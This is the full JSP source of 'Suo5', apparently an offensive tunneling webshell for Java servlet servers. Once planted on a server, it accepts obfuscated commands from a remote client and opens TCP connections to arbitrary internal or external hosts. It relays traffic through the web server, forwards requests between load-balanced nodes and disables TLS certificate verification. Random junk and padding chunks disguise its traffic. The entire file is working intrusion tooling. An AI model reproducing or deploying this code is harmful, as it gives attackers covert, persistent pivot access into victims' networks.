<%@ page import="java.nio.ByteBuffer" %><%@ page import="java.io.*" %><%@ page import="java.net.*" %><%@ page import="java.security.cert.X509Certificate" %><%@ page import="java.security.cert.CertificateException" %><%@ page import="javax.net.ssl.*" %><%@ page import="java.util.*" %><%@ page import="javax.servlet.*"%><%@ page import="java.util.concurrent.BlockingQueue" %><%@ page import="java.util.concurrent.LinkedBlockingQueue" %><%@ page import="java.security.MessageDigest" %><%@ page import="java.security.NoSuchAlgorithmException" %><%@ page import="java.util.concurrent.TimeUnit" %><%@ page import="java.nio.channels.SocketChannel" %><%!
    public static class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
        private static HashMap addrs = collectAddr();
        private static Hashtable ctx = new Hashtable();

        private final String CHARACTERS = "abcdefghijklmnopqrstuvwxyz0123456789";
        private final int CHARACTERS_LENGTH = CHARACTERS.length();
        private final int BUF_SIZE = 1024 * 16;

        private InputStream gInStream;
        private OutputStream gOutStream;
        private String gtunId;
        private int mode = 0;

        public Suo5() {
        }

        public Suo5(InputStream in, OutputStream out, String tunId) {
            this.gInStream = in;
            this.gOutStream = out;
            this.gtunId = tunId;
        }

        public Suo5(String tunId, int mode) {
            this.gtunId = tunId;
            this.mode = mode;
        }

        private void process(ServletRequest request, ServletResponse response) {
            HttpServletRequest req = (HttpServletRequest) request;
            HttpServletResponse resp = (HttpServletResponse) response;

            String sid = null;
            byte[] bodyPrefix = new byte[0];
            try {
                InputStream reqInputStream = req.getInputStream();
                HashMap dataMap = unmarshalBase64(reqInputStream);

                byte[] modeData = (byte[]) dataMap.get("m");
                byte[] actionData = (byte[]) dataMap.get("ac");
                byte[] tunIdData = (byte[]) dataMap.get("id");
                byte[] sidData = (byte[]) dataMap.get("sid");
                if (actionData == null || actionData.length != 1 || tunIdData == null || tunIdData.length == 0 || modeData == null || modeData.length == 0) {
                    return;
                }
                if (sidData != null && sidData.length > 0) {
                    sid = new String(sidData);
                }

                String tunId = new String(tunIdData);
                byte mode = modeData[0];
                switch (mode) {
                    case 0x00:
                        sid = randomString(16);
                        processHandshake(req, resp, dataMap, tunId, sid);

                        break;
                    case 0x01:
                        setBypassHeader(resp);
                        processFullStream(req, resp, dataMap, tunId);
                        break;
                    case 0x02:
                        setBypassHeader(resp);
                        // don't break here, continue to process
                    case 0x03:
                        byte[] bodyContent = toByteArray(reqInputStream);
                        if (processRedirect(req, resp, dataMap, bodyPrefix, bodyContent)) {

                            break;
                        }

                        if (sidData == null || sidData.length == 0 || getKey(new String(sidData)) == null) {
                            // send to wrong node, client should retry
                            resp.setStatus(403);

                            return;
                        }

                        InputStream bodyStream = new ByteArrayInputStream(bodyContent);
                        int dirySize = getDirtySize(sid);

                        if (mode == 0x02) {
                            // half mode
                            writeAndFlush(resp, processTemplateStart(resp, new String(sidData)), dirySize);
                            do {
                                processHalfStream(req, resp, dataMap, tunId, dirySize);
                                try {
                                    dataMap = unmarshalBase64(bodyStream);
                                    if (dataMap.isEmpty()) {
                                        break;
                                    }
                                    tunId = new String((byte[]) dataMap.get("id"));
                                } catch (Exception e) {
                                    break;
                                }
                            } while (true);
                            writeAndFlush(resp, processTemplateEnd(sid), dirySize);

                        } else {
                            // classic mode
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            baos.write(processTemplateStart(resp, new String(sidData)));

                            do {
                                processClassic(req, baos, dataMap, tunId);
                                try {
                                    dataMap = unmarshalBase64(bodyStream);
                                    if (dataMap.isEmpty()) {
                                        break;
                                    }
                                    tunId = new String((byte[]) dataMap.get("id"));
                                } catch (Exception e) {
                                    break;
                                }
                            } while (true);

                            baos.write(processTemplateEnd(sid));
                            resp.setContentLength(baos.size());
                            writeAndFlush(resp, baos.toByteArray(), 0);
                        }

                        break;
                    default:
                }
            } catch (Throwable e) {
            } finally {
                try {
                    OutputStream out = resp.getOutputStream();
                    out.flush();
                    out.close();
                } catch (Throwable ignored) {}
            }
        }

        private void setBypassHeader(HttpServletResponse resp) {
            resp.setBufferSize(BUF_SIZE);
            resp.setHeader("X-Accel-Buffering", "no");
        }

        private byte[] processTemplateStart(HttpServletResponse resp, String sid) throws Exception {
            byte[] data = new byte[0];
            Object o = getKey(sid);
            if (o == null) {

                return data;
            }
            String[] tplParts = (String[]) o;
            if (tplParts.length != 3) {
                return data;
            }

            resp.setHeader("Content-Type", tplParts[0]);
            return tplParts[1].getBytes();
        }

        private byte[] processTemplateEnd(String sid) {
            byte[] data = new byte[0];
            Object o = getKey(sid);
            if (o == null) {

                return data;
            }
            String[] tplParts = (String[]) o;
            if (tplParts.length != 3) {
                return data;
            }

            return tplParts[2].getBytes();
        }

        private int getDirtySize(String sid) {
            Object o = getKey(sid + "_jk");
            if (o == null) {
                return 0;
            }
            return (Integer) o;
        }

        private boolean processRedirect(HttpServletRequest req, HttpServletResponse resp, HashMap dataMap, byte[] bodyPrefix, byte[] bodyContent) throws Exception {
            byte[] redirectData = (byte[]) dataMap.get("r");
            dataMap.remove("r");
            // load balance, send request with data to request url
            boolean needRedirect = redirectData != null && redirectData.length > 0;
            if (needRedirect && !isLocalAddr(new String(redirectData))) {
                HttpURLConnection conn = null;
                try {
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    baos.write(bodyPrefix);
                    baos.write(marshalBase64(dataMap));
                    baos.write(bodyContent);
                    byte[] newBody = baos.toByteArray();
                    conn = redirect(req, new String(redirectData), newBody);
                    pipeStream(conn.getInputStream(), resp.getOutputStream(), false);
                } finally {
                    if (conn != null) {
                        conn.disconnect();
                    }
                }
                return true;
            }
            return false;
        }

        private void processHandshake(HttpServletRequest req, HttpServletResponse resp, HashMap dataMap, String tunId, String sid) throws Exception {
            byte[] redirectData = (byte[]) dataMap.get("r");
            boolean needRedirect = redirectData != null && redirectData.length > 0;
            if (needRedirect && !isLocalAddr(new String(redirectData))) {
                resp.setStatus(403);
                return;
            }

            byte[] tplData = (byte[]) dataMap.get("tpl");
            byte[] contentTypeData = (byte[]) dataMap.get("ct");
            if (tplData != null && tplData.length > 0 && contentTypeData != null && contentTypeData.length > 0) {
                String tpl = new String(tplData);
                String[] parts = tpl.split("#data#", 2);
                putKey(sid, new String[]{new String(contentTypeData), parts[0], parts[1]});
            } else {
                putKey(sid, new String[0]);
            }

            byte[] dirtySizeData = (byte[]) dataMap.get("jk");
            if (dirtySizeData != null && dirtySizeData.length > 0) {
                int dirtySize = 0;
                try {
                    dirtySize = Integer.parseInt(new String(dirtySizeData));
                } catch (NumberFormatException e) {

                }
                if (dirtySize < 0) {
                    dirtySize = 0;
                }
                putKey(sid + "_jk", dirtySize);
            }

            byte[] isAutoData = (byte[]) dataMap.get("a");
            boolean isAuto = isAutoData != null && isAutoData.length > 0 && isAutoData[0] == 0x01;
            if (isAuto) {
                setBypassHeader(resp);
                writeAndFlush(resp, processTemplateStart(resp, sid), 0);

                // write the body string to verify
                writeAndFlush(resp, marshalBase64(newData(tunId, (byte[]) dataMap.get("dt"))), 0);

                Thread.sleep(2000);

                // write again to identify streaming response
                writeAndFlush(resp, marshalBase64(newData(tunId, sid.getBytes())), 0);
                writeAndFlush(resp, processTemplateEnd(sid), 0);
            } else {
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                baos.write(processTemplateStart(resp, sid));
                baos.write(marshalBase64(newData(tunId, (byte[]) dataMap.get("dt"))));
                baos.write(marshalBase64(newData(tunId, sid.getBytes())));
                baos.write(processTemplateEnd(sid));
                resp.setContentLength(baos.size());
                writeAndFlush(resp, baos.toByteArray(), 0);
            }
        }

        private void processFullStream(HttpServletRequest req, HttpServletResponse resp, HashMap dataMap, String tunId) throws Exception {
            InputStream reqInputStream = req.getInputStream();
            String host = new String((byte[]) dataMap.get("h"));
            int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
            if (port == 0) {
                port = getServerPort(req);
            }

            Socket socket = null;

            try {
                socket = new Socket();
                socket.setTcpNoDelay(true);
                socket.setReceiveBufferSize(128 * 1024);
                socket.setSendBufferSize(128 * 1024);
                socket.connect(new InetSocketAddress(host, port), 5000);
                writeAndFlush(resp, marshalBase64(newStatus(tunId, (byte) 0x00)), 0);
            } catch (Exception e) {
                if (socket != null) {
                    socket.close();
                }
                writeAndFlush(resp, marshalBase64(newStatus(tunId, (byte) 0x01)), 0);
                return;
            }


            Thread t = null;
            boolean sendClose = true;
            final OutputStream scOutStream = socket.getOutputStream();
            final InputStream scInStream = socket.getInputStream();
            final OutputStream respOutputStream = resp.getOutputStream();

            try {
                Suo5 p = new Suo5(scInStream, respOutputStream, tunId);
                t = new Thread(p);
                t.start();

                while (true) {
                    HashMap newData = unmarshalBase64(reqInputStream);
                    if (newData.isEmpty()) {
                        break;
                    }
                    byte action = ((byte[]) newData.get("ac"))[0];
                    switch (action) {
                        case 0x00:
                        case 0x02:
                            sendClose = false;
                            break;
                        case 0x01:
                            byte[] data = (byte[]) newData.get("dt");
                            if (data.length != 0) {
                                scOutStream.write(data);
                                scOutStream.flush();
                            }
                            break;
                        case 0x10:
                            writeAndFlush(resp, marshalBase64(newHeartbeat(tunId)), 0);
                            break;
                        default:
                    }
                }
            } catch (Exception ignored) {
            } finally {
                try {
                    socket.close();
                } catch (Exception ignored) {
                }

                try {
                    respOutputStream.close();
                } catch (Exception ignored) {
                }

                if (sendClose) {
                    writeAndFlush(resp, marshalBase64(newDel(tunId)), 0);
                }
                
                if (t != null) {
                    t.join();
                }

            }
        }

        private void processHalfStream(HttpServletRequest req, HttpServletResponse resp, HashMap dataMap, String tunId, int dirtySize) throws Exception {
            boolean newThread = false;
            boolean sendClose = true;

            try {
                byte action = ((byte[]) dataMap.get("ac"))[0];
                switch (action) {
                    case 0x00:
                        byte[] createData = performCreate(req, dataMap, tunId, newThread);
                        writeAndFlush(resp, createData, dirtySize);

                        Object[] objs = (Object[]) getKey(tunId);
                        if (objs == null) {
                            throw new IOException("tunnel not found");
                        }
                        SocketChannel sc = (SocketChannel) objs[0];
                        ByteBuffer buffer = ByteBuffer.allocate(BUF_SIZE);
                        while (true) {
                            try {
                                byte[] data = readSocketChannel(sc, buffer);
                                if (data.length == 0) {
                                    break;
                                }
                                writeAndFlush(resp, marshalBase64(newData(tunId, data)), dirtySize);
                            } catch (Exception e) {
//
                                break;
                            }
                        }
                        break;
                    case 0x01:
                        performWrite(dataMap, tunId, newThread);
                        break;
                    case 0x02:

                        sendClose = false;
                        performDelete(tunId);
                        break;
                    case 0x10:
                        writeAndFlush(resp, marshalBase64(newHeartbeat(tunId)), dirtySize);
                        break;
                }

            } catch (Exception e) {

                performDelete(tunId);
                if (sendClose) {
                    writeAndFlush(resp, marshalBase64(newDel(tunId)), dirtySize);
                }
            }
        }

        private void processClassic(HttpServletRequest req, ByteArrayOutputStream respBodyStream, HashMap dataMap, String tunId) throws
                Exception {
            boolean sendClose = true;
            boolean newThread = true;

            try {
                byte action = ((byte[]) dataMap.get("ac"))[0];
                switch (action) {
                    case 0x00:
                        byte[] createData = performCreate(req, dataMap, tunId, newThread);
                        respBodyStream.write(createData);
                        break;
                    case 0x01:
                        performWrite(dataMap, tunId, newThread);
                        byte[] readData = performRead(tunId);
                        respBodyStream.write(readData);
                        break;
                    case 0x02:
                        sendClose = false;
                        performDelete(tunId);
                        break;
                }

            } catch (Exception e) {

                performDelete(tunId);
                if (sendClose) {
                    respBodyStream.write(marshalBase64(newDel(tunId)));
                }
            }
        }

        private void writeAndFlush(HttpServletResponse resp, byte[] data, int dirtySize) throws Exception {
            if (data == null || data.length == 0) {
                return;
            }
            OutputStream out = resp.getOutputStream();
            out.write(data);
            if (dirtySize != 0) {

                out.write(marshalBase64(newDirtyChunk(dirtySize)));
            }
            out.flush();
            resp.flushBuffer();
        }

        private byte[] performCreate(HttpServletRequest request, HashMap dataMap, String tunId, boolean newThread) throws Exception {
            String host = new String((byte[]) dataMap.get("h"));
            int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
            if (port == 0) {
                port = getServerPort(request);
            }

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            SocketChannel socketChannel = null;
            HashMap resultData = null;
            try {
                socketChannel = SocketChannel.open();
                socketChannel.socket().setTcpNoDelay(true);
                socketChannel.socket().setReceiveBufferSize(128 * 1024);
                socketChannel.socket().setSendBufferSize(128 * 1024);
                socketChannel.socket().connect(new InetSocketAddress(host, port), 3000);
                socketChannel.configureBlocking(true);
                resultData = newStatus(tunId, (byte) 0x00);
                BlockingQueue<byte[]> readQueue = new LinkedBlockingQueue<byte[]>(100);
                BlockingQueue<byte[]> writeQueue = new LinkedBlockingQueue<byte[]>();
                putKey(tunId, new Object[]{socketChannel, readQueue, writeQueue});
                if (newThread) {
                    new Thread(new Suo5(tunId, 1)).start();
                    new Thread(new Suo5(tunId, 2)).start();
                }
            } catch (Exception e) {
                if (socketChannel != null) {
                    try {
                        socketChannel.close();
                    } catch (Exception ignore) {
                    }
                }

                resultData = newStatus(tunId, (byte) 0x01);
            }
            baos.write(marshalBase64(resultData));
            return baos.toByteArray();
        }

        private void performWrite(HashMap dataMap, String tunId, boolean newThread) throws Exception {
            Object[] objs = (Object[]) getKey(tunId);
            if (objs == null) {
                throw new IOException("tunnel not found");
            }
            SocketChannel sc = (SocketChannel) objs[0];
            if (!sc.isConnected()) {
                throw new IOException("socket not connected");
            }

            byte[] data = (byte[]) dataMap.get("dt");
            if (data.length != 0) {
                if (newThread) {
                    BlockingQueue<byte[]> writeQueue = (BlockingQueue<byte[]>) objs[2];
                    writeQueue.put(data);
                } else {
                    ByteBuffer buf = ByteBuffer.wrap(data);
                    while (buf.hasRemaining()) {
                        sc.write(buf);
                    }
                }
            }
        }

        private byte[] performRead(String tunId) throws Exception {
            Object[] objs = (Object[]) getKey(tunId);
            if (objs == null) {
                throw new IOException("tunnel not found");
            }
            SocketChannel sc = (SocketChannel) objs[0];
            if (!sc.isConnected()) {
                throw new IOException("socket not connected");
            }
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            BlockingQueue<byte[]> readQueue = (BlockingQueue<byte[]>) objs[1];
            int maxSize = 512 * 1024; // 1MB
            int written = 0;
            while (true) {
                byte[] data = readQueue.poll();
                if (data != null) {
                    written += data.length;
                    baos.write(marshalBase64(newData(tunId, data)));
                    if (written >= maxSize) {
                        break;
                    }
                } else {
                    break; // no more data
                }
            }
            return baos.toByteArray();
        }

        private void performDelete(String tunId) {
            Object[] objs = (Object[]) getKey(tunId);
            if (objs != null) {
                removeKey(tunId);
                SocketChannel sc = (SocketChannel) objs[0];
                BlockingQueue<byte[]> writeQueue = (BlockingQueue<byte[]>) objs[2];
                try {
                    // trigger write thread to exit;
                    writeQueue.put(new byte[0]);
                    sc.close();
                } catch (Exception ignore) {
                }
            }
        }

        private int getServerPort(HttpServletRequest request) throws Exception {
            int port;
            try {
                port = ((Integer) request.getClass().getMethod("getLocalPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
            } catch (Exception e) {
                port = ((Integer) request.getClass().getMethod("getServerPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
            }
            return port;
        }

        private void pipeStream(InputStream inputStream, OutputStream outputStream, boolean needMarshal) throws Exception {
            try {
                byte[] readBuf = new byte[1024 * 8];
                while (true) {
                    int n = inputStream.read(readBuf);
                    if (n <= 0) {
                        break;
                    }
                    byte[] dataTmp = copyOfRange(readBuf, 0, 0 + n);
                    if (needMarshal) {
                        dataTmp = marshalBase64(newData(this.gtunId, dataTmp));
                    }
                    outputStream.write(dataTmp);
                    outputStream.flush();
                }
            } finally {
                // don't close outputStream
                if (inputStream != null) {
                    try {
                        inputStream.close();
                    } catch (Exception ignore) {
                    }
                }
            }
        }

        private byte[] readSocketChannel(SocketChannel socketChannel, ByteBuffer buffer) throws IOException {
            buffer.clear();
            int bytesRead = socketChannel.read(buffer);
            if (bytesRead <= 0) { // EOF or error
                return new byte[0];
            }

            buffer.flip();
            byte[] data = new byte[buffer.remaining()];
            buffer.get(data);
            return data;
        }

        private static HashMap collectAddr() {
            HashMap addrs = new HashMap();
            try {
                Enumeration nifs = NetworkInterface.getNetworkInterfaces();
                while (nifs.hasMoreElements()) {
                    NetworkInterface nif = (NetworkInterface) nifs.nextElement();
                    Enumeration addresses = nif.getInetAddresses();
                    while (addresses.hasMoreElements()) {
                        InetAddress addr = (InetAddress) addresses.nextElement();
                        String s = addr.getHostAddress();
                        if (s != null) {
                            // fe80:0:0:0:fb0d:5776:2d7c:da24%wlan4  strip %wlan4
                            int ifaceIndex = s.indexOf('%');
                            if (ifaceIndex != -1) {
                                s = s.substring(0, ifaceIndex);
                            }
                            addrs.put((Object) s, (Object) Boolean.TRUE);
                        }
                    }
                }
            } catch (Exception e) {
            }
            return addrs;
        }

        private boolean isLocalAddr(String url) throws Exception {
            String ip = (new URL(url)).getHost();
            return addrs.containsKey(ip);
        }

        private HttpURLConnection redirect(HttpServletRequest request, String rUrl, byte[] body) throws Exception {
            String method = request.getMethod();
            URL u = new URL(rUrl);
            HttpURLConnection conn = (HttpURLConnection) u.openConnection();
            conn.setRequestMethod(method);
            try {
                // conn.setConnectTimeout(3000);
                conn.getClass().getMethod("setConnectTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(3000)});
                // conn.setReadTimeout(0);
                conn.getClass().getMethod("setReadTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(0)});
            } catch (Exception e) {
                // java1.4
            }
            conn.setDoOutput(true);
            conn.setDoInput(true);

            // ignore ssl verify
            // ref: https://github.com/L-codes/Neo-reGeorg/blob/master/templates/NeoreGeorg.java
            if (HttpsURLConnection.class.isInstance(conn)) {
                ((HttpsURLConnection) conn).setHostnameVerifier(this);
                SSLContext sslCtx = SSLContext.getInstance("SSL");
                sslCtx.init(null, new TrustManager[]{this}, null);
                ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
            }

            Enumeration headers = request.getHeaderNames();
            while (headers.hasMoreElements()) {
                String k = (String) headers.nextElement();
                if (k.equalsIgnoreCase("Content-Length")) {
                    conn.setRequestProperty(k, String.valueOf(body.length));
                } else if (k.equalsIgnoreCase("Host")) {
                    conn.setRequestProperty(k, u.getHost());
                } else if (k.equalsIgnoreCase("Connection")) {
                    conn.setRequestProperty(k, "close");
                } else if (k.equalsIgnoreCase("Content-Encoding") || k.equalsIgnoreCase("Transfer-Encoding")) {
                    continue;
                } else {
                    conn.setRequestProperty(k, request.getHeader(k));
                }
            }

            OutputStream rout = conn.getOutputStream();
            rout.write(body);
            rout.flush();
            rout.close();
            conn.getResponseCode();
            return conn;
        }


        private byte[] toByteArray(InputStream in) {
            try {
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] buffer = new byte[4096];

                int len;
                while ((len = in.read(buffer)) != -1) {
                    baos.write(buffer, 0, len);
                }

                return baos.toByteArray();
            } catch (IOException var5) {
                return new byte[0];
            }
        }

        private void readFull(InputStream is, byte[] b) throws IOException {
            int bufferOffset = 0;
            while (bufferOffset < b.length) {
                int readLength = b.length - bufferOffset;
                int readResult = is.read(b, bufferOffset, readLength);
                if (readResult == -1) {
                    throw new IOException("stream EOF");
                }
                bufferOffset += readResult;
            }
        }

        public HashMap newDirtyChunk(int size) {
            HashMap m = new HashMap();
            m.put("ac", new byte[]{0x11});
            if (size > 0) {
                byte[] data = new byte[size];
                new Random().nextBytes(data);
                m.put("d", data);
            }
            return m;
        }

        private HashMap newData(String tunId, byte[] data) {
            HashMap m = new HashMap();
            m.put("ac", new byte[]{0x01});
            m.put("dt", data);
            m.put("id", tunId.getBytes());
            return m;
        }

        private HashMap newDel(String tunId) {
            HashMap m = new HashMap();
            m.put("ac", new byte[]{0x02});
            m.put("id", tunId.getBytes());
            return m;
        }

        private HashMap newStatus(String tunId, byte b) {
            HashMap m = new HashMap();
            m.put("ac", new byte[]{0x03});
            m.put("s", new byte[]{b});
            m.put("id", tunId.getBytes());
            return m;
        }

        private HashMap newHeartbeat(String tunId) {
            HashMap m = new HashMap();
            m.put("ac", new byte[]{0x10});
            m.put("id", tunId.getBytes());
            return m;
        }

        private byte[] u32toBytes(int i) {
            byte[] result = new byte[4];
            result[0] = (byte) (i >> 24);
            result[1] = (byte) (i >> 16);
            result[2] = (byte) (i >> 8);
            result[3] = (byte) (i /*>> 0*/);
            return result;
        }

        private int bytesToU32(byte[] bytes) {
            return ((bytes[0] & 0xFF) << 24) |
                    ((bytes[1] & 0xFF) << 16) |
                    ((bytes[2] & 0xFF) << 8) |
                    ((bytes[3] & 0xFF) << 0);
        }

        private void putKey(String k, Object v) {
            ctx.put(k, v);
        }

        private Object getKey(String k) {
            return ctx.get(k);
        }

        private void removeKey(String k) {
            ctx.remove(k);
        }

        private byte[] copyOfRange(byte[] original, int from, int to) {
            int newLength = to - from;
            if (newLength < 0) {
                throw new IllegalArgumentException(from + " > " + to);
            }
            byte[] copy = new byte[newLength];
            int copyLength = Math.min(original.length - from, newLength);
            // can't use System.arraycopy, there is no system in some environment
            // System.arraycopy(original, from, copy, 0,  copyLength);
            for (int i = 0; i < copyLength; i++) {
                copy[i] = original[from + i];
            }
            return copy;
        }

        private String base64UrlEncode(byte[] bs) throws Exception {
            Class base64;
            String value = null;
            try {
                base64 = Class.forName("java.util.Base64");
                Object Encoder = base64.getMethod("getEncoder", new Class[0])
                        .invoke(base64, new Object[0]);
                value = (String) Encoder.getClass()
                        .getMethod("encodeToString", new Class[]{byte[].class})
                        .invoke(Encoder, new Object[]{bs});
            } catch (Exception e) {
                try {
                    base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = base64.newInstance();
                    value = (String) Encoder.getClass()
                            .getMethod("encode", new Class[]{byte[].class})
                            .invoke(Encoder, new Object[]{bs});
                    value = value.replaceAll("\\s+", "");
                } catch (Exception e2) {
                }
            }
            if (value != null) {
                value = value.replace('+', '-').replace('/', '_');
                while (value.endsWith("=")) {
                    value = value.substring(0, value.length() - 1);
                }
            }
            return value;
        }


        private byte[] base64UrlDecode(String bs) throws Exception {
            if (bs == null) {
                return null;
            }
            bs = bs.replace('-', '+').replace('_', '/');
            while (bs.length() % 4 != 0) {
                bs += "=";
            }

            Class base64;
            byte[] value = null;
            try {
                base64 = Class.forName("java.util.Base64");
                Object decoder = base64.getMethod("getDecoder", new Class[0]).invoke(base64, new Object[0]);
                value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e) {
                try {
                    base64 = Class.forName("sun.misc.BASE64Decoder");
                    Object decoder = base64.newInstance();
                    value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
                } catch (Exception e2) {
                }
            }
            return value;
        }

        private byte[] marshalBase64(HashMap m) throws Exception {
            // add some junk data, 0~16 random size
            Random random = new Random();
            int junkSize = random.nextInt(32);
            if (junkSize > 0) {
                byte[] junk = new byte[junkSize];
                random.nextBytes(junk);
                m.put("_", junk);
            }

            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            Object[] keys = m.keySet().toArray();
            for (int i = 0; i < keys.length; i++) {
                String key = (String) keys[i];
                byte[] value = (byte[]) m.get(key);
                buf.write((byte) key.length());
                buf.write(key.getBytes());
                buf.write(u32toBytes(value.length));
                buf.write(value);
            }

            // xor key
            byte[] key = new byte[2];
            key[0] = (byte) ((Math.random() * 255) + 1);
            key[1] = (byte) ((Math.random() * 255) + 1);

            byte[] data = buf.toByteArray();
            for (int i = 0; i < data.length; i++) {
                data[i] = (byte) (data[i] ^ key[i % 2]);
            }
            data = base64UrlEncode(data).getBytes();

            ByteBuffer dbuf = ByteBuffer.allocate(6);
            dbuf.put(key);
            dbuf.putInt(data.length);
            byte[] headerData = dbuf.array();
            for (int i = 2; i < 6; i++) {
                headerData[i] = (byte) (headerData[i] ^ key[i % 2]);
            }
            headerData = base64UrlEncode(headerData).getBytes();
            dbuf = ByteBuffer.allocate(8 + data.length);
            dbuf.put(headerData);
            dbuf.put(data);
            return dbuf.array();
        }

        private HashMap unmarshalBase64(InputStream in) throws Exception {
            HashMap m = new HashMap();
            byte[] header = new byte[8]; // base64 header
            readFull(in, header);
            header = base64UrlDecode(new String(header));
            if (header == null || header.length == 0) {
                return m;
            }
            byte[] xor = new byte[]{header[0], header[1]};
            for (int i = 2; i < 6; i++) {
                header[i] = (byte) (header[i] ^ xor[i % 2]);
            }
            ByteBuffer bb = ByteBuffer.wrap(header, 2, 4);
            int len = bb.getInt();
            if (len > 1024 * 1024 * 32) {
                throw new IOException("invalid len");
            }
            byte[] bs = new byte[len];
            readFull(in, bs);
            bs = base64UrlDecode(new String(bs));
            for (int i = 0; i < bs.length; i++) {
                bs[i] = (byte) (bs[i] ^ xor[i % 2]);
            }

            byte[] buf;
            for (int i = 0; i < bs.length; ) {
                int kLen = bs[i] & 0xFF;
                i += 1;
                if (i + kLen > bs.length) {
                    throw new Exception("key len error");
                }
                buf = copyOfRange(bs, i, i + kLen);
                String key = new String(buf);
                i += kLen;

                if (i + 4 > bs.length) {
                    throw new Exception("value len error");
                }
                buf = copyOfRange(bs, i, i + 4);
                int vLen = bytesToU32(buf);
                i += 4;
                if (vLen < 0) {
                    throw new Exception("value error");
                }

                if (i + vLen > bs.length) {
                    throw new Exception("value error");
                }
                byte[] value = copyOfRange(bs, i, i + vLen);
                i += vLen;

                m.put(key, value);
            }
            return m;
        }

        private String randomString(int length) {
            if (length <= 0) {
                return "";
            }
            Random random = new Random();
            char[] randomChars = new char[length];
            for (int i = 0; i < length; i++) {
                int randomIndex = random.nextInt(CHARACTERS_LENGTH);
                randomChars[i] = CHARACTERS.charAt(randomIndex);
            }
            return new String(randomChars);
        }

        public boolean verify(String hostname, SSLSession session) {
            return true;
        }

        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
        }

        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
        }

        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }

        public void run() {
            // full stream
            if (this.mode == 0) {
                try {
                    pipeStream(gInStream, gOutStream, true);
                } catch (Exception ignore) {
                }
                return;
            }

            Object[] objs = (Object[]) getKey(this.gtunId);
            if (objs == null || objs.length != 3) {

                return;
            }
            SocketChannel sc = (SocketChannel) objs[0];
            BlockingQueue<byte[]> readQueue = (BlockingQueue<byte[]>) objs[1];
            BlockingQueue<byte[]> writeQueue = (BlockingQueue<byte[]>) objs[2];
            boolean selfClean = false;

            try {
                if (mode == 1) {
                    // read thread
                    ByteBuffer buffer = ByteBuffer.allocate(BUF_SIZE);
                    while (true) {
                        byte[] data = readSocketChannel(sc, buffer);
                        if (data.length == 0) {
                            break;
                        }
                        if (!readQueue.offer(data, 60, TimeUnit.SECONDS)) {
                            selfClean = true;
                            break;
                        }
                    }
                } else {
                    // write thread
                    while (true) {
                        byte[] data = writeQueue.poll(300, TimeUnit.SECONDS);
                        if (data == null || data.length == 0) {
                            selfClean = true;
                            break;
                        }
                        ByteBuffer buf = ByteBuffer.wrap(data);
                        while (buf.hasRemaining()) {
                            sc.write(buf);
                        }
                    }
                }
            } catch (Exception e) {
            } finally {
                if (selfClean) {

                    removeKey(this.gtunId);
                }
                readQueue.clear();
                writeQueue.clear();
                try {
                    writeQueue.put(new byte[0]);
                    sc.close();
                } catch (Exception ignore) {
                }

            }
        }
    }
%><%
    Suo5 o = new Suo5();
    o.process(request, response);
    try {
        out.clear();
    } catch (Exception e) {
    }
    out = pageContext.pushBody();
%>